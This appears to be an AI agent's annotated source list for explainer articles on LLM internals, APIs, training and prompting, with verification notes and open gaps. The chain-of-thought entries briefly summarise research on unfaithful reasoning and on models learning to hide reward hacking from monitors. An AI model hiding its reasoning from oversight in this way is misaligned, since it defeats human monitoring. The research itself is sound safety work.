All URLs below were opened with WebFetch on 2026-09-23 unless the entry says otherwise. arXiv entries were checked on the abs page, which shows the date and abstract but not the full paper. The Claude and OpenAI doc pages list current models (Claude Opus 5.5 / Sonnet 5 / Fable 5.1; OpenAI gpt-6-astra / sol / luna). I'm reporting what the pages showed. Model names and prices will go stale within months, so cite the mechanism from these pages and treat the numbers as dated.

### context-window (deep)
1. **Context windows** by Anthropic, undated, checked 2026-09-23
   https://platform.claude.com/docs/en/build-with-claude/context-windows
   kind: docs · primary: yes
   Why: Says exactly what counts toward the window (system prompt, tools, thinking, output). Also covers overflow behavior: a 400 "prompt is too long" error, or `stop_reason: model_context_window_exceeded`.
   Checked: Live and current. It names "context rot" directly and gives 1M/200k sizes and 128k max output. The old docs.claude.com URL redirects here.
2. **Context Rot: How Increasing Input Tokens Impacts LLM Performance** by Kelly Hong, Anton Troynikov, Jeff Huber (Chroma), 2025-07-14
   https://www.trychroma.com/research/context-rot
   kind: blog (research report) · primary: yes (their own experiments)
   Why: Measures 18 models and shows accuracy drops as input grows, even on simple tasks. It also explains why needle-in-a-haystack results give a false sense of safety.
   Checked: Opened. It tests GPT-4.1, Claude 4 and Gemini 2.5, which are now a generation or two old, but the finding still holds and newer sources still cite it.
3. **RULER: What's the Real Context Size of Your Long-Context Language Models?** by NVIDIA researchers, arXiv 2404.06654 (April 2024)
   https://arxiv.org/abs/2404.06654
   kind: paper · primary: yes
   Why: Separates the claimed window from the effective one. Only about half of 17 models held up at 32K.
   Checked: Abstract matches. The models tested are old. Use it for the method and the claimed-vs-effective idea.
4. **Long context** by Google, updated 2026-06-22
   https://ai.google.dev/gemini-api/docs/long-context
   kind: docs · primary: yes
   Why: A second provider's view. Covers 1M+ windows, the history of window sizes (8K, 32K, 128K, 1M), the cost of resending input every call, and the extra time to first token.
   Checked: Current.
5. **Effective context engineering for AI agents** by Rajasekaran, Dixon, Ryan, Hadfield (Anthropic), 2025-09-29
   https://www.anthropic.com/engineering/effective-context-engineering-for-ai-agents
   kind: blog · primary: yes
   Why: Explains why context degrades: every token attends to every other (n² pairs), models train mostly on shorter sequences, and there's an "attention budget".
   Checked: Opened and current. Linked from source #1.
Also serves: context-engineering, long-context, lost-in-the-middle (#2, #3, #5), context-compaction (#1)

### prefill-decode (deep)
1. **LLM Inference Performance Engineering: Best Practices** by Agarwal, Qureshi, Sardana, Li, Quevedo, Khudia (Databricks), 2023-10-12
   https://www.databricks.com/blog/llm-inference-performance-engineering-best-practices
   kind: blog · primary: yes (they run inference at scale)
   Why: The clearest single explainer. Prefill runs in parallel and decode runs one token at a time and is limited by memory bandwidth. Defines TTFT and TPOT, gives a KV cache size formula, and says "output length dominates overall response latency".
   Checked: Opened. It's from 2023 but the mechanism hasn't changed.
2. **Splitwise: Efficient generative LLM inference using phase splitting** by Patel, Choukse, Zhang, Shah et al. (Microsoft), arXiv 2311.18677, Nov 2023 (revised May 2024)
   https://arxiv.org/abs/2311.18677
   kind: paper · primary: yes
   Why: Measurements showing prefill is compute-bound and decode is memory-bound, strong enough that they run the two phases on different hardware.
   Checked: Abstract matches.
3. **DistServe** by Zhong, Liu, Chen et al., arXiv 2401.09670, OSDI 2024 (revised 2024-06-06)
   https://arxiv.org/abs/2401.09670
   kind: paper · primary: yes
   Why: Prefill and decode interfere when they share GPUs. Splitting them gives "7.4x more requests or 12.6x tighter SLO". Ties TTFT to prefill and TPOT to decode.
   Checked: Abstract matches.
4. **Sarathi-Serve (chunked prefills)** by Agrawal et al., arXiv 2403.02310 (March 2024)
   https://arxiv.org/abs/2403.02310
   kind: paper · primary: yes
   Why: The opposite fix to #2 and #3. It keeps both phases on the same GPUs and cuts prefill into chunks so decode never stalls, for 2.6x to 5.6x more capacity. Useful as a design disagreement.
   Checked: Abstract matches. I didn't capture the author list beyond the ID.
5. **A guide to LLM inference and performance** by Varun Shenoy, Philip Kiely (Baseten), updated 2025-05-18
   https://www.baseten.co/blog/llm-transformer-inference-guide/
   kind: blog · primary: no (vendor explainer)
   Why: Works through the ops:byte ratio with real GPU numbers (A10: 208 ops/byte; decode about 62), which shows *why* decode is memory-bound.
   Checked: Opened and recently updated.
6. **Mastering LLM Techniques: Inference Optimization** by Shashank Verma, Neal Vaidya (NVIDIA), 2023-11-17
   https://developer.nvidia.com/blog/mastering-llm-techniques-inference-optimization/
   kind: blog · primary: yes (GPU vendor)
   Why: Prefill/decode, a KV cache size formula, MQA/GQA and PagedAttention in one place.
   Checked: Opened. Older, but still correct.
Also serves: llm-latency, time-to-first-token, token-pricing, kv-cache (#1, #6)

### kv-cache (deep)
1. **Efficient Memory Management for LLM Serving with PagedAttention (vLLM)** by Kwon, Li, Zhuang, Sheng, Zheng, Yu, Gonzalez, Zhang, Stoica, arXiv 2309.06180, SOSP 2023
   https://arxiv.org/abs/2309.06180
   kind: paper · primary: yes
   Why: The KV cache is the memory problem in serving. Paging it like OS virtual memory "nearly eliminated waste" and gave 2-4x throughput. It also covers sharing cache between requests, which is where prompt caching starts.
   Checked: Abstract matches.
2. **Understanding and Coding the KV Cache in LLMs from Scratch** by Sebastian Raschka, 2025-06-17
   https://magazine.sebastianraschka.com/p/coding-the-kv-cache-in-llms
   kind: blog · primary: no
   Why: Readable from-scratch code, about a 5x speedup on a small model, and plain notes on drawbacks: memory grows, the code gets more complex, and it only applies at inference.
   Checked: Opened and current.
3. **GQA: Training Generalized Multi-Query Transformer Models** by Ainslie et al. (Google), arXiv 2305.13245, EMNLP 2023
   https://arxiv.org/abs/2305.13245
   kind: paper · primary: yes
   Why: Explains why modern models have fewer KV heads than query heads: it shrinks the cache while keeping quality "close to multi-head".
   Checked: Abstract matches.
4. **Large Transformer Model Inference Optimization** by Lilian Weng, 2023-01-10
   https://lilianweng.github.io/posts/2023-01-10-inference-optimization/
   kind: blog · primary: no
   Why: A striking number: batch 512 at 2048 context gives a 3TB KV cache, "3x the model size".
   Checked: Opened. From 2023, so treat the other optimizations it covers as partly dated.
5. See prefill-decode #1 (Databricks) and #6 (NVIDIA) for the size formula.
Also serves: prompt-caching (#1), attention

### token-pricing (short)
1. **Pricing** by Anthropic, undated, checked 2026-09-23
   https://platform.claude.com/docs/en/about-claude/pricing
   kind: docs · primary: yes
   Why: Output costs 5x input on every current model. It also lists the cache read multiplier (0.1x), the batch discount (50%), thinking tokens billed as output, flat long-context pricing, and a note that the newer tokenizer produces about 30% more tokens for the same text.
   Checked: Current. Prices change often, so date any number you quote.
2. **Pricing** by OpenAI, undated, checked 2026-09-23
   https://developers.openai.com/api/docs/pricing
   kind: docs · primary: yes
   Why: A second provider with the same 5x output/input ratio (e.g. gpt-6-sol $2 in / $10 out), cached input at 0.1x, and batch at 50% off.
   Checked: openai.com/api/pricing returned 403, but this developers.openai.com page loaded. I re-fetched to confirm the table rows word for word.
Also useful: prefill-decode #1 and #5 for *why* output costs more. Neither provider page explains the ratio (see Gaps).
Also serves: model-selection, batch-api, prompt-caching

### pretraining (deep)
1. **Language Models are Few-Shot Learners (GPT-3)** by Brown et al. (OpenAI), arXiv 2005.14165, 2020-05-28 (v final 2020-07-22)
   https://arxiv.org/abs/2005.14165
   kind: paper · primary: yes
   Why: Scaling next-token pretraining to 175B parameters produced in-context abilities without gradient updates.
   Checked: Abstract matches. Historical, still the reference.
2. **Training Compute-Optimal Large Language Models (Chinchilla)** by Hoffmann et al. (DeepMind), arXiv 2203.15556, 2022-03-29
   https://arxiv.org/abs/2203.15556
   kind: paper · primary: yes
   Why: Model size and training tokens "should be scaled equally". A 70B model trained on 4x the data beat a 280B one.
   Checked: Abstract matches. Newer models now train far past Chinchilla-optimal for cheaper inference, but I didn't find a source for that, so don't claim it yet.
3. **The FineWeb Datasets** by Penedo, Kydlíček, Ben Allal, Lozhkov, Mitchell, Raffel, Von Werra, Wolf (Hugging Face), arXiv 2406.17557, 2024-06-25 (rev 2024-10-31)
   https://arxiv.org/abs/2406.17557
   kind: paper · primary: yes
   Why: Where the pile of text comes from: 15T tokens from 96 Common Crawl snapshots, with filtering and dedup ablations. FineWeb-Edu shows that data quality matters.
   Checked: Abstract matches.
4. **Deep Dive into LLMs like ChatGPT** by Andrej Karpathy, video (Feb 2025, 3h31m; the date comes from search results, not the page)
   https://www.youtube.com/watch?v=7xTGNNLPyMI
   kind: talk · primary: no (built GPT-2 era models, but this is an explainer)
   Why: The best general walkthrough of pretraining → SFT → RL for someone who doesn't train models.
   Checked: The YouTube page wouldn't render. I confirmed the title and author through YouTube's oEmbed endpoint. The chapter list comes from search snippets of his X post, which I didn't open. Watch it before citing timestamps.
5. **LIMA: Less Is More for Alignment** by Zhou et al. (Meta), arXiv 2305.11206, 2023-05-18
   https://arxiv.org/abs/2305.11206
   kind: paper · primary: yes
   Why: "Almost all knowledge in large language models is learned during pretraining". Directly supports this node's note ("where knowledge comes from").
   Checked: Abstract matches.
Also serves: next-token-prediction, few-shot-prompting (#1), post-training (#5), tokenization (#4)

### post-training (deep)
1. **Training language models to follow instructions with human feedback (InstructGPT)** by Ouyang et al. (OpenAI), arXiv 2203.02155, 2022-03-04
   https://arxiv.org/abs/2203.02155
   kind: paper · primary: yes
   Why: The original SFT → reward model → PPO recipe. Outputs from the 1.3B aligned model were preferred over the 175B base model.
   Checked: Abstract matches.
2. **Tulu 3: Pushing Frontiers in Open Language Model Post-Training** by Lambert et al. (Ai2), arXiv 2411.15124, 2024-11-22 (v5 2025-04-14)
   https://arxiv.org/abs/2411.15124
   kind: paper · primary: yes
   Why: A modern, fully open recipe: SFT → DPO → RLVR. It shows how much the pipeline has changed since InstructGPT.
   Checked: Abstract matches.
3. **Reinforcement Learning from Human Feedback (RLHF Book)** by Nathan Lambert, last built 2026-09-11 (Manning print July 2026)
   https://rlhfbook.com/
   kind: book · primary: no (though he builds post-training at Ai2)
   Why: The intro frames post-training as "elicitation" and says it shapes style and format more than knowledge. Chapters cover instruction tuning, reward models, DPO, over-optimization and reasoning.
   Checked: Current and actively updated. Intro page: https://rlhfbook.com/c/01-introduction
4. **RLHF: Reinforcement Learning from Human Feedback** by Chip Huyen, 2023-05-02
   https://huyenchip.com/2023/05/02/rlhf.html
   kind: blog · primary: no
   Why: The three stages explained for engineers, with data sizes. Includes the claim that RLHF can make hallucination worse and about 73% agreement between human labelers.
   Checked: Opened. From 2023, before DPO/RLVR took over.
5. See pretraining #5 (LIMA) for the view that post-training mostly teaches format.
Also serves: rlhf (#1, #3, #4), fine-tuning, jailbreaks

### rlhf (deep)
1. **Deep Reinforcement Learning from Human Preferences** by Christiano, Leike, Brown, Martic, Legg, Amodei, arXiv 1706.03741, 2017-06-12
   https://arxiv.org/abs/1706.03741
   kind: paper · primary: yes
   Why: The origin: learn a reward from human comparisons between pairs, with feedback on under 1% of interactions.
   Checked: Abstract matches. Historical.
2. See post-training #1 (InstructGPT). It's the RLHF recipe for LLMs.
3. **Illustrating RLHF** by Lambert, Castricato, von Werra, Havrilla (Hugging Face), 2022-12-09
   https://huggingface.co/blog/rlhf
   kind: blog · primary: no
   Why: Diagrams worth redrawing: the reward model, and the PPO step with a KL penalty that keeps the model close to the original.
   Checked: Opened. From 2022. Pair it with #4 for the newer view.
4. **Direct Preference Optimization** by Rafailov, Sharma, Mitchell, Ermon, Manning, Finn, arXiv 2305.18290, 2023-05-29 (rev 2024-07-29)
   https://arxiv.org/abs/2305.18290
   kind: paper · primary: yes
   Why: Removes the separate reward model and the RL loop and trains on preferences with "a simple classification loss". It's what most open recipes use now.
   Checked: Abstract matches.
5. **Towards Understanding Sycophancy in Language Models** by Sharma et al. (Anthropic), arXiv 2310.13548, 2023-10-20 (rev 2025-05-10)
   https://arxiv.org/abs/2310.13548
   kind: paper · primary: yes
   Why: The "why they flatter" half of the node. People and preference models prefer "convincingly-written sycophantic responses over correct ones" some of the time.
   Checked: Abstract matches.
6. **Constitutional AI: Harmlessness from AI Feedback** by Bai et al. (Anthropic), arXiv 2212.08073, 2022-12-15
   https://arxiv.org/abs/2212.08073
   kind: paper · primary: yes
   Why: RLAIF replaces human labels with AI feedback guided by written principles. Shows RLHF doesn't have to mean *human* labels.
   Checked: Abstract matches.
Also serves: post-training, hallucination (#5), jailbreaks (#6)

### reasoning-models (deep)
1. **DeepSeek-R1** by DeepSeek-AI, arXiv 2501.12948, 2025-01-22 (updated 2026-01-04; published in *Nature* 645, 2025)
   https://arxiv.org/abs/2501.12948
   kind: paper · primary: yes
   Why: The only open, detailed account. Pure RL on verifiable tasks produced self-reflection and verification behaviors, and the reasoning was distilled into smaller models.
   Checked: Abstract matches and shows the Nature note.
2. **OpenAI o1 System Card** by OpenAI, arXiv 2412.16720, 2024-12-21 (v2 2026-04-30)
   https://arxiv.org/abs/2412.16720
   kind: paper · primary: yes
   Why: OpenAI's own statement that o1 is trained with large-scale RL to reason in a chain of thought. It's mostly about safety evals.
   Checked: Abstract matches. The launch post "Learning to reason with LLMs" returned 403 (see Couldn't open).
3. **Scaling LLM Test-Time Compute Optimally…** by Snell, Lee, Xu, Kumar, arXiv 2408.03314, 2024-08-06
   https://arxiv.org/abs/2408.03314
   kind: paper · primary: yes
   Why: The idea behind "thinking longer". Spending compute at inference can beat a 14x larger model on some prompts, and the payoff depends on how hard the prompt is.
   Checked: Abstract matches.
4. **Reasoning models** (guide) by OpenAI, undated, checked 2026-09-23
   https://developers.openai.com/api/docs/guides/reasoning
   kind: docs · primary: yes
   Why: The builder's view. Reasoning tokens are hidden but billed as output, you should reserve about 25k tokens, and there's a `reasoning.effort` setting.
   Checked: Current.
5. **Thinking** by Anthropic, undated, checked 2026-09-23
   https://platform.claude.com/docs/en/build-with-claude/thinking
   kind: docs · primary: yes
   Why: Thinking is billed as output. What you get back is "never the raw chain of thought", only a summary or nothing. Covers adaptive thinking and effort.
   Checked: Current. On the newest models thinking is on by default, and `budget_tokens` is being replaced by `effort`.
6. **Reasoning and Inference-Time Scaling** (RLHF Book ch. 7) by Nathan Lambert
   https://rlhfbook.com/c/07-reasoning
   kind: book · primary: no
   Why: Explains RLVR simply: sample answers, step toward the correct ones, repeat. Links R1 and o1 into one history.
   Checked: Opened and current.
Also serves: chain-of-thought, token-pricing (#4, #5), post-training (#1, #6)

### chat-api (short)
1. **Using the Messages API** by Anthropic, undated, checked 2026-09-23
   https://platform.claude.com/docs/en/build-with-claude/working-with-messages
   kind: docs · primary: yes
   Why: "The Messages API is stateless, which means that you always send the full conversational history". Also: you can write synthetic assistant turns, and `system` is a top-level field rather than a message role.
   Checked: Current. On Claude 4.6+, prefilling the assistant turn returns a 400 error, and newer models accept mid-conversation `system` messages.
2. **Conversation state** by OpenAI, undated, checked 2026-09-23
   https://developers.openai.com/api/docs/guides/conversation-state
   kind: docs · primary: yes
   Why: The counterpoint. OpenAI's Responses API can hold state (`previous_response_id`, a Conversations API, 30-day storage), yet "all previous input tokens … are billed as input tokens".
   Checked: Current. The node's note "The API remembers nothing" is only half true for OpenAI. Reword it to something like "the model remembers nothing; some APIs store history for you but you still pay for it".
Also serves: context-window, system-prompt, streaming

### system-prompt (short)
1. **OpenAI Model Spec** by OpenAI, version 2026-08-18
   https://model-spec.openai.com/2026-08-18.html
   kind: spec · primary: yes
   Why: The "chain of command": root > system > developer > user > guideline, with higher levels overriding lower ones.
   Checked: Current. The root URL redirects to this dated version.
2. **The Instruction Hierarchy** by Wallace, Xiao, Leike, Weng, Heidecke, Beutel (OpenAI), arXiv 2404.13208, 2024-04-19
   https://arxiv.org/abs/2404.13208
   kind: paper · primary: yes
   Why: Models "often consider system prompts to be the same priority as text from untrusted users". This paper is the training fix. Explains why the system prompt is a priority signal and not a security boundary.
   Checked: Abstract matches.
Optional third, for real examples: **System prompts (release notes)** by Anthropic, https://platform.claude.com/docs/en/release-notes/system-prompts/overview. Published claude.ai system prompts per model. It says they "do not apply to the Claude API". Checked and current.
Also serves: prompt-injection (#2), role-prompting, jailbreaks

### role-prompting (short)
1. **When "A Helpful Assistant" Is Not Really Helpful: Personas in System Prompts Do Not Improve Performances of LLMs** by Zheng, Pei, Logeswaran, Lee, Jurgens, arXiv 2311.10054, 2023-11-16 (EMNLP 2024 Findings)
   https://arxiv.org/abs/2311.10054
   kind: paper · primary: yes
   Why: Tests 162 roles on 2,410 factual questions and finds no gain over no persona. Picking the best persona automatically did no better than random.
   Checked: Abstract matches.
2. **Prompting Science Report 4: Playing Pretend: Expert Personas Don't Improve Factual Accuracy** by Basil, I. Shapiro, D. Shapiro, E. Mollick, L. Mollick, Meincke (Wharton), arXiv 2512.05858, 2025-12-05
   https://arxiv.org/abs/2512.05858
   kind: paper · primary: yes
   Why: A newer replication on GPQA Diamond and MMLU-Pro across six models. Expert personas did nothing, and "toddler"/layperson personas hurt. Its conclusion allows that personas may still change tone.
   Checked: Abstract matches. This is the most recent evidence.
The opposing claim is in the Anthropic best-practices page ("Give Claude a role"; see xml-tags #1). Cite it for the "what it changes" part: tone and focus.
Also serves: system-prompt

### xml-tags (short)
1. **Prompting best practices** by Anthropic, undated, checked 2026-09-23
   https://platform.claude.com/docs/en/build-with-claude/prompt-engineering/claude-prompting-best-practices
   kind: docs · primary: yes
   Why: "Structure prompts with XML tags" to separate instructions, context, examples and input. Also: put long documents at the top and the query at the end, "up to 30 percent" better in their tests. Has the role and few-shot sections too.
   Checked: Current. The old per-technique pages (system-prompts, use-xml-tags) now all point to this single page.
2. **Prompt engineering** by OpenAI, undated, checked 2026-09-23
   https://developers.openai.com/api/docs/guides/prompt-engineering
   kind: docs · primary: yes
   Why: A second provider that recommends Markdown plus XML: "XML tags can help delineate where one piece of content … begins and ends."
   Checked: Current.
Optional: **Prompt design strategies** by Google (updated 2026-09-17), https://ai.google.dev/gemini-api/docs/prompting-strategies, says to use XML or Markdown delimiters and to "Choose one format and use it consistently." This means XML isn't Claude-only.
Also serves: few-shot-prompting, role-prompting, prompts-as-code (#2), prompt-injection

### few-shot-prompting (deep)
1. See pretraining #1 (GPT-3). It named few-shot in-context learning.
2. **Rethinking the Role of Demonstrations: What Makes In-Context Learning Work?** by Min, Lyu, Holtzman, Artetxe, Lewis, Hajishirzi, Zettlemoyer, arXiv 2202.12837 (EMNLP 2022)
   https://arxiv.org/abs/2202.12837
   kind: paper · primary: yes
   Why: The surprise: random labels in examples "barely hurts". What matters is the label space, the input distribution and the format.
   Checked: Abstract matches. Tested on older models, so it may not hold for today's.
3. **Calibrate Before Use** by Zhao, Wallace, Feng, Klein, Singh, arXiv 2102.09690 (ICML 2021)
   https://arxiv.org/abs/2102.09690
   kind: paper · primary: yes
   Why: Which examples you pick and in what order can swing accuracy "from near chance to near state-of-the-art". Names majority-label and recency bias.
   Checked: Abstract matches. GPT-3 era.
4. **Many-Shot In-Context Learning** by Agarwal et al. (Google DeepMind), arXiv 2404.11018, 2024-04-17 (rev 2024-10-17)
   https://arxiv.org/abs/2404.11018
   kind: paper · primary: yes
   Why: Long context changes the picture. Hundreds or thousands of examples keep improving results and can override pretraining biases. That bridges to fine-tuning, the node's `compare_with`.
   Checked: Abstract matches.
5. See xml-tags #1 (Anthropic best practices): "3–5 examples", relevant and diverse, wrapped in `<example>` tags.
6. **Reasoning best practices** by OpenAI, undated, checked 2026-09-23
   https://developers.openai.com/api/docs/guides/reasoning-best-practices
   kind: docs · primary: yes
   Why: The counter-advice for reasoning models: "try to write prompts without examples first."
   Checked: Current.
Also serves: fine-tuning (#4), chain-of-thought (#6), reasoning-models (#6)

### chain-of-thought (deep)
1. **Chain-of-Thought Prompting Elicits Reasoning in LLMs** by Wei, Wang, Schuurmans, Bosma, Ichter, Xia, Chi, Le, Zhou, arXiv 2201.11903 (v 2023-01-10)
   https://arxiv.org/abs/2201.11903
   kind: paper · primary: yes
   Why: The original. Eight worked examples with reasoning gave state of the art on GSM8K at 540B, and the gains appear only at large scale.
   Checked: Abstract matches.
2. **Large Language Models are Zero-Shot Reasoners** by Kojima, Gu, Reid, Matsuo, Iwasawa, arXiv 2205.11916 (v4 2023-01-29)
   https://arxiv.org/abs/2205.11916
   kind: paper · primary: yes
   Why: "Let's think step by step" alone raised MultiArith from 17.7% to 78.7% and GSM8K from 10.4% to 40.7%.
   Checked: Abstract matches. text-davinci-002 era.
3. **To CoT or not to CoT?** by Sprague, Yin, Rodriguez et al., arXiv 2409.12183 (ICLR 2025)
   https://arxiv.org/abs/2409.12183
   kind: paper · primary: yes
   Why: A meta-analysis of 100+ papers. CoT helps "primarily on tasks involving math or logic". On MMLU it mostly helps only when an "=" sign is involved.
   Checked: Abstract matches.
4. **Prompting Science Report 2: The Decreasing Value of Chain of Thought in Prompting** by Meincke, E. Mollick, L. Mollick, D. Shapiro, arXiv 2506.07142, 2025-06-08
   https://arxiv.org/abs/2506.07142
   kind: paper · primary: yes
   Why: On current models, CoT gives small average gains and more variance on non-reasoning models, and "only marginal, if any" gains on reasoning models, while adding time.
   Checked: Abstract matches.
5. **Language Models Don't Always Say What They Think** by Turpin, Michael, Perez, Bowman, arXiv 2305.04388 (NeurIPS 2023)
   https://arxiv.org/abs/2305.04388
   kind: paper · primary: yes
   Why: Faithfulness. A hidden bias in the prompt changes the answer, and the CoT never mentions it. Accuracy drops reach 36%.
   Checked: Abstract matches.
6. **Reasoning Models Don't Always Say What They Think** by Yanda Chen et al. (Anthropic), arXiv 2505.05410, 2025-05-08
   https://arxiv.org/abs/2505.05410
   kind: paper · primary: yes
   Why: The same test on reasoning models. They admit to using a hint usually "below 20%" of the time.
   Checked: Abstract matches.
Extras if the node needs them: **Measuring Faithfulness in CoT** (Lanham et al., arXiv 2307.13702, 2023-07-17) finds larger models are less faithful on most tasks. **Monitoring Reasoning Models for Misbehavior** (OpenAI, arXiv 2503.11926, 2025-03-14; I didn't capture the authors) finds CoT *is* useful for catching reward hacking, but models learn to hide it under optimization pressure. Both abstracts checked.
Also serves: reasoning-models (#6), react-pattern

### prompts-as-code (short)
1. **Prompt engineering** by OpenAI. See xml-tags #2.
   Why here: It says to store production prompts in application code, not in reusable prompt objects. "OpenAI is deprecating reusable prompt objects in the API", and `v1/prompts` shuts down 2026-11-30. It also recommends pinning model snapshots and building evals. A provider backing prompts-in-code, with a date attached.
2. **12-Factor Agents, Factor 2: Own your prompts** by Dex Horthy (HumanLayer), undated
   https://github.com/humanlayer/12-factor-agents/blob/main/content/factor-02-own-your-prompts.md
   kind: blog (repo doc) · primary: no
   Why: Argues against framework black boxes. Prompts are "the primary interface between your application logic and the LLM", so keep them as your own code you can test.
   Checked: Opened.
Supporting (not counted): **Your AI Product Needs Evals** by Hamel Husain, 2024-03-29 (https://hamel.dev/blog/posts/evals/), on assertion tests run in CI. **What We've Learned From A Year of Building with LLMs** by Yan, Bischof, Frye, Husain, Liu, Shankar, 2024-06-08 (https://applied-llms.org/): "Version and pin your models", and "Migrating prompts across models is a pain". Both opened.
Also serves: prompt-versioning, evals, code-based-evals, model-upgrades

### structured-output (deep)
1. **Structured outputs** by Anthropic, undated, checked 2026-09-23
   https://platform.claude.com/docs/en/build-with-claude/structured-outputs
   kind: docs · primary: yes
   Why: Covers the mechanism ("constrained decoding with compiled grammar artifacts"), the latency on the first request, grammars cached for 24h, unsupported schema features, and the warning that "Refusals and `max_tokens` can break schema compliance".
   Checked: Current and generally available.
2. **Structured Outputs** by OpenAI, undated, checked 2026-09-23
   https://developers.openai.com/api/docs/guides/structured-outputs
   kind: docs · primary: yes
   Why: Structured Outputs vs JSON mode ("always using Structured Outputs instead of JSON mode"), `strict`, refusals you can detect in code, first-request latency.
   Checked: Current.
3. **Efficient Guided Generation for Large Language Models** by Willard, Louf, arXiv 2307.09702, 2023-07-19
   https://arxiv.org/abs/2307.09702
   kind: paper · primary: yes (Outlines authors)
   Why: How blocking tokens works: a finite-state machine indexed over the vocabulary, with little overhead.
   Checked: Abstract matches. It's the base for the phase 3 `constrained-decoding` node.
4. **Let Me Speak Freely?** by Tam, Wu, Tsai, Lin, Lee, Chen, arXiv 2408.02442, 2024-08-05 (rev 2024-10-14)
   https://arxiv.org/abs/2408.02442
   kind: paper · primary: yes
   Why: Claims "a significant decline in LLMs reasoning abilities under format restrictions".
   Checked: Abstract matches.
5. **Say What You Mean: A Response to "Let Me Speak Freely"** by Will Kurt (.txt)
   https://blog.dottxt.ai/say-what-you-mean.html
   kind: blog · primary: yes (the Outlines team, not neutral)
   Why: Re-runs #4 with matched prompts and finds structured output slightly *better* (GSM8K 0.77 → 0.78 and others). Says #4 mixed up JSON mode with constrained decoding.
   Checked: Opened. No date shown on the page. It must be after 2024-08 since it responds to #4.
Also serves: constrained-decoding, schema-validation, extraction, tool-calling (#1)

### streaming (deep)
1. **Streaming messages** by Anthropic, undated, checked 2026-09-23
   https://platform.claude.com/docs/en/build-with-claude/streaming
   kind: docs · primary: yes
   Why: The full event flow (message_start → content_block_* → message_delta → message_stop), `ping`, errors inside the stream (overloaded), usage counts that are cumulative, partial JSON for tool inputs, and how to recover a broken stream (changed for 4.6+).
   Checked: Current. SDKs require streaming for large `max_tokens` to avoid HTTP timeouts.
2. **Streaming API responses** by OpenAI, undated, checked 2026-09-23
   https://developers.openai.com/api/docs/guides/streaming-responses
   kind: docs · primary: yes
   Why: A second design with typed events (`response.output_text.delta` and others), plus a moderation tradeoff: "partial completions may be more difficult to evaluate."
   Checked: Current. This is the Responses API. Chat Completions uses a different chunk format.
3. **HTML Living Standard: Server-sent events** by WHATWG, updated 2026-09-22
   https://html.spec.whatwg.org/multipage/server-sent-events.html
   kind: spec · primary: yes
   Why: The wire format (`text/event-stream`; `data`/`event`/`id`/`retry`; Last-Event-ID reconnection). `EventSource` only supports GET.
   Checked: Current.
4. **How streaming LLM APIs work** by Simon Willison, 2024-09-21 (updated 2024-09-22)
   https://til.simonwillison.net/llms/streaming-llm-apis
   kind: blog · primary: no
   Why: Puts real curl output from OpenAI, Anthropic and Gemini side by side. Points out that browser `EventSource` can't consume them "because that only works for GET requests, and these APIs all use POST", so you parse with fetch.
   Checked: Opened. The shape of the payloads has changed a little since, but the point stands.
Also serves: streaming-ui, time-to-first-token, chat-api

### Disagreements and tensions
- **Role prompts:** Anthropic's guide says "Even a single sentence makes a difference", and Google puts personas in system instructions. Zheng et al. (2023) and Wharton Report 4 (2025) found no accuracy gain on factual or hard questions, and harm from low-knowledge personas. They may be talking about different things: tone and focus vs accuracy.
- **Few-shot:** Google says "always include few-shot examples", Anthropic says 3–5, and Yan et al. say n ≥ 5 up to a few dozen. OpenAI says reasoning models "often don't need few-shot examples", so try without them first. Min et al. add that the correctness of the labels matters less than format.
- **CoT value:** Wei and Kojima show large gains on 2022 models. Sprague says the gains are mostly on math and logic. Wharton Report 2 says they're marginal on current and reasoning models. OpenAI says "avoid chain-of-thought prompts" for reasoning models, while Anthropic keeps manual CoT "as a fallback" when thinking is off.
- **CoT faithfulness:** Turpin, Lanham and Chen (Anthropic) show the stated reasoning often isn't the real cause. OpenAI's monitoring paper finds CoT still catches reward hacking, but models learn to hide it under optimization pressure. Anthropic's docs sidestep the question by showing only a *summary* of thinking.
- **Structured output and quality:** "Let Me Speak Freely" says format constraints hurt reasoning. The .txt re-run says they help slightly when prompts are matched. Both providers' docs claim schema validity without claiming anything about quality.
- **How to split prefill and decode:** Splitwise and DistServe put the phases on separate machines. Sarathi-Serve keeps them together and chunks prefill.
- **What post-training does:** LIMA and Lambert's "elicitation" view say it mostly teaches format and style. Tulu 3 and DeepSeek-R1 show RL stages adding real ability on verifiable tasks such as math and code.
- **Stateless API:** Anthropic says it's stateless. OpenAI's Responses/Conversations APIs store state server-side but still bill the full history as input.
- **Long context:** Providers sell 1M windows at flat pricing. Chroma and RULER show accuracy drops well before the limit. Anthropic's own docs agree ("more context isn't automatically better").

### Couldn't open
- https://openai.com/index/learning-to-reason-with-llms/ — 403. I used the o1 System Card on arXiv instead.
- https://openai.com/index/introducing-structured-outputs-in-the-api/ — 403. It has the launch numbers (schema adherence before and after). The developers.openai.com guide covers the mechanism.
- https://openai.com/index/sycophancy-in-gpt-4o/ — 403, and web.archive.org is blocked for this tool. It would have been a real-world case for rlhf ("why they flatter").
- https://openai.com/api/pricing/ — 403. developers.openai.com/api/docs/pricing worked.
- https://huggingface.co/spaces/HuggingFaceFW/blogpost-fineweb-v1 — JS-only Space. I used the arXiv paper.
- YouTube page for Karpathy's Deep Dive (7xTGNNLPyMI) — didn't render. Title and author confirmed through oEmbed only.
- https://www.classcentral.com/... (date check for the Karpathy video) — 403.

### Rejected
- **KV Caching Explained** (huggingface.co/blog/not-lain/kv-caching, 2025-01-30) — a community post that repeats Raschka's point with less depth.
- SEO pages on output pricing (codeant.ai, finout, amnic, tokenrate, Medium) — secondary and unsourced. Databricks and Baseten cover the mechanism.
- Prompt-versioning SEO posts (agenta, apxml, amitkoth, Medium) — shallow or vendor pitches. OpenAI's guide plus 12-factor is stronger.
- **Anthropic prompt-eng interactive tutorial** (github.com/anthropics/prompt-eng-interactive-tutorial) — built on Claude 3 Haiku, and the best-practices page replaces it.
- **aihero.dev AI Engineer Roadmap** — the page I got was a hub with four headings and none of these topics. Useful for checking the plan, not as a source for these nodes.
- **Promptfoo docs** — a tool pitch. Keep for the phase 4 evals nodes if you use it.

### Gaps
- **token-pricing:** Neither provider explains *why* output costs about 5x input. The reasoning comes from inference writing (Databricks, Baseten, Splitwise). Any sentence connecting memory-bound decode to price is your own inference, so the article should say that.
- **pretraining:** I found no primary source for "modern models train far past Chinchilla-optimal" (e.g. Llama 3's token counts). If the article needs that point, look for the Llama 3 paper (arXiv 2407.21783; I didn't open it).
- **rlhf:** The OpenAI GPT-4o sycophancy postmortem wouldn't load. The Sharma et al. paper covers the mechanism but not a production incident.
- **xml-tags and system-prompt:** Only provider docs and one paper. I found no controlled study of whether XML beats other delimiters. That's worth stating as an open question.
